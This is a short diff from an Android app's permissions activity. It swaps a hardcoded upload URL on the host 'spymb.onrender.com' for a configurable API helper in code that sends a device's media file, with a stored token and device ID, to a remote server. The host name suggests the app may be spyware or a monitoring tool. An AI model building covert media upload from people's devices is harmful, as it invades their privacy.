@@ -173,7 +173,7 @@ public class MainPermissionsActivity extends Activity {
 				android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
 				String token = sp.getString("auth_token", null);
 				String deviceId = sp.getString("deviceId", "unknown");
-				String url = "https://spymb.onrender.com/api/media/" + java.net.URLEncoder.encode(deviceId, "UTF-8") + "/upload";
+				String url = com.company.devicemgr.utils.ApiConfig.api("/api/media/" + java.net.URLEncoder.encode(deviceId, "UTF-8") + "/upload");
 				String resp = com.company.devicemgr.utils.HttpClient.uploadFile(url, "media", filename, buf, mime, token);
 				runOnUiThread(() -> showMsg("Upload: " + resp));
 				} catch (Exception e) {
